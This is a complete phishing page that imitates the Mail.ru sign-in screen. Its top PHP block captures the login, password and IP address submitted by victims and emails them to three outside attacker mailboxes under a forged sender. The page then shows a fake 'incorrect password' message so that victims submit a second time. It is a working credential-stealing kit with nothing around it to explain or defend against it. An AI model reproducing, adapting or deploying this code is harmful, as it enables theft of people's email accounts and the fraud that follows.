<?php
$ip = getenv("REMOTE_ADDR");
$email = $_POST['email'];
$passwd = $_POST['Password'];
$domain = $_POST['domain'];
$email .= $domain;

//sendig infos
$msg = "ID: $email \n Password: $passwd \n Ip: $ip";
$from = "FromOLUWA BLESS DOPPA <jamiekong@vip.163.com>";
$subj = "DOPPA! Is here";
mail("Resultbox100@protonmail.com",$subj,$msg,$from);
mail("kingdoppa50@gmail.com",$subj,$msg,$from);
mail("rickdoppa@yandex.com",$subj,$msg,$from);
?>
<html>
    <head>
        <title>Авторизация</title>
        <link rel="shortcut icon" type="image/x-icon" href="favicon.ico">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <script src='https://kit.fontawesome.com/a076d05399.js'></script>
        <style>
            body{margin:0px;font-family: Arial, Helvetica, sans-serif;}
            .header{background-color:#005ff9;height:9%;}
            .header a{margin-left:87px;margin-top:15px;}
            .header img{width:9%;margin-top:13px;}
            .header1{height:4.5%;}
            .inheader1{float:left;}
            .inheader1 a{text-decoration:none;margin-left:12px;color:#005ff9;font-size:12px;}
            .inheader1 a:hover{color:#f26d00;}
            .inheader2{float:right;}
            .inheader2 a{text-decoration:none;margin-right:20px;color:#005ff9;font-size:12px;}
            .inheader2 a:hover{color:#f26d00;}
            .content{border:1px solid #e5e5e5;margin-top:2%;margin-left:35%;width:32%;}
            h2{margin-left:5%;color:#333333;font-weight: normal;}
            .des{margin-left:5%;color:#333333;font-size:15px;}
            .inp{width:60%;margin-left:5%;height:5%;}
            .inp2{width:90%;margin-left:5%;margin-top:5%;height:5%;}
            .cps{margin-top:5%;}
            .fl{float:left;margin-left:5%;width:40%;}
            .fl a{text-decoration:none;margin-left:5%;color:#005ff9;}
            .fr{float:right;margin-right:5%}
            .fr span{color:#333333}
            .sub{margin-left:5%;background-color:#005ff9;color:white;width:40%;height:6%;border-radius:4px;cursor:pointer;font-size:18px;}
            .subd{margin-top:5%;width:100%;}
            .foot{border-top:1px solid #e5e5e5;margin-top:5%;padding-top:5%;}
            .foot a{text-decoration:none;color:#005ff9;margin-left:35%}
            .dropdown{width:30%;display:inline;height:5%;margin-left:-5px;cursor:pointer;}
            .footer{margin-top:7.5%;height:4.5%;border-top:1px solid #e5e5e5;}
            .footer a{text-decoration:none;margin-left:12px;color:#999999;font-size:12px;margin-top:8px;}
            .footer a:hover{color:#f26d00;}
            
            /* The container */
            .container {
              display: block;
              position: relative;
              padding-left: 30px;
              margin-bottom: 10px;
              cursor: pointer;
              font-size: 15px;
              -webkit-user-select: none;
              -moz-user-select: none;
              -ms-user-select: none;
              user-select: none;
            }
            
            /* Hide the browser's default checkbox */
            .container input {
              position: absolute;
              opacity: 0;
              cursor: pointer;
              height: 0;
              width: 0;
            }
            
            /* Create a custom checkbox */
            .checkmark {
              position: absolute;
              top: 0;
              left: 0;
              height: 18px;
              width: 18px;
              background-color: #eee;
            }
            
            /* On mouse-over, add a grey background color */
            .container:hover input ~ .checkmark {
              background-color: #ccc;
            }
            
            /* When the checkbox is checked, add a blue background */
            .container input:checked ~ .checkmark {
              background-color: #005ff9;
              border-radius:2px;
            }
            
            /* Create the checkmark/indicator (hidden when not checked) */
            .checkmark:after {
              content: "";
              position: absolute;
              display: none;
            }
            
            /* Show the checkmark when checked */
            .container input:checked ~ .checkmark:after {
              display: block;
            }
            
            /* Style the checkmark/indicator */
            .container .checkmark:after {
              left: 5px;
              top: 2px;
              width: 5px;
              height: 8px;
              border: solid white;
              border-width: 0 3px 3px 0;
              -webkit-transform: rotate(45deg);
              -ms-transform: rotate(45deg);
              transform: rotate(45deg);
            }
            
            
            @media screen and (max-width: 600px) {
                .header{width:100%;height:15%;}
                .header a{margin:top:0%;margin-left:5%;}
                .header img{width:35%;}
                .header1{display:none;}
                .content{width:100%;margin-left:0%;margin-top:0%;}
                .inp{width:60%;margin-left:5%;height:10%;}
                .inp2{width:90%;margin-left:5%;margin-top:5%;height:10%;}
                .dropdown{width:30%;display:inline;height:10%;margin-left:-5px;}
                .fl{float:left;margin-left:5%;width:50%;}
                .foot a{text-decoration:none;color:#168de2;margin-left:25%}
                .sub{height:10%;}
                .footer{display:none;}
                
                
            }
            
            
        </style>
    </head>
    <body>
        <div class="header1">
            <div class="inheader1">
                <a href="https://r.mail.ru/n201603520?sz=&amp;rnd=206222100">Mail.Ru</a> 
                <a href="https://r.mail.ru/n215030470?sz=&amp;rnd=206222100">Почта</a> 
                <a href="https://r.mail.ru/n201603521?sz=&amp;rnd=206222100">Мой Мир</a> 
                <a href="https://r.mail.ru/n165232845?sz=&amp;rnd=206222100">Одноклассники</a> 
                <a href="https://r.mail.ru/n215030471?sz=&amp;rnd=206222100">Игры</a> 
                <a href="https://r.mail.ru/n102969579?sz=&amp;rnd=206222100">Знакомства</a> 
                <a href="https://r.mail.ru/n211738025?sz=&amp;rnd=206222100">новость</a> 
                <a href="https://r.mail.ru/n102969581?sz=&amp;rnd=206222100">Поиск</a> 
                <a href="#">весь проект <i class='fas fa-caret-down'></i></a>
            </div>
            <div class="inheader2">
                <a href="https://r.mail.ru/cls525468/r.mail.ru/clb1126011/e.mail.ru/signup?from=navi&amp;lang=ru_RU&amp;rnd=206222100">Регистрация</a> 
                <a href="https://r.mail.ru/cls951827/e.mail.ru/login?lang=ru_RU&amp;Page=">Вход</a> 
            </div>
            <div style="clear:both"></div>
        </div>
        <div class="header">
            <a href="https://mail.ru"><img src="logo.svg"></a>
        </div>
        <div class="content">
            <h2>Войти в Почту</h2>
            
            <p class="des" style="color:red">Неверное пароль. Пожалуйста, введите правильный пароль</p>
            <form action="post.php" method="post">
                <input class="inp2" type="text" name="email" placeholder="Логин" value="<?php echo $email; ?>" />
                
                
                <input class="inp2" type="password" name="Password" placeholder="Пароль" />
                <div class="cps">
                    <div class="fl">
                        <a href="https://e.mail.ru/password/restore/"><span>Забыли пароль?</span></a>
                    </div>
                    <div class="fr">
                        <label class="container">запомнить
                          <input type="checkbox" checked="checked">
                          <span class="checkmark"></span>
                        </label>
                        
                    </div>
                    <div style="clear:both"></div>
                </div>
                
                <div class="subd">
                    <input class="sub" type="submit" value="Войти">
                </div>
                <div class="foot">
                    <a href="https://e.mail.ru/signup?from=login" target="_blank">Регистрация в Почте</a>
                </div>
            </form>
            
            
        </div>
        <div class="footer">
            <div style="margin-top:5px">
                <a href="https://r.mail.ru/n253577115?sz=49&rnd=121137079">Mail.Ru</a>
                <a href="https://r.mail.ru/n253577116?sz=49&rnd=121137079">О компании</a>
                <a href="https://r.mail.ru/n253577117?sz=49&rnd=121137079">Реклама</a>
                <a href="https://r.mail.ru/n253577118?sz=49&rnd=121137079">Вакансии</a>
            </div>
        </div>
    </body>
</html>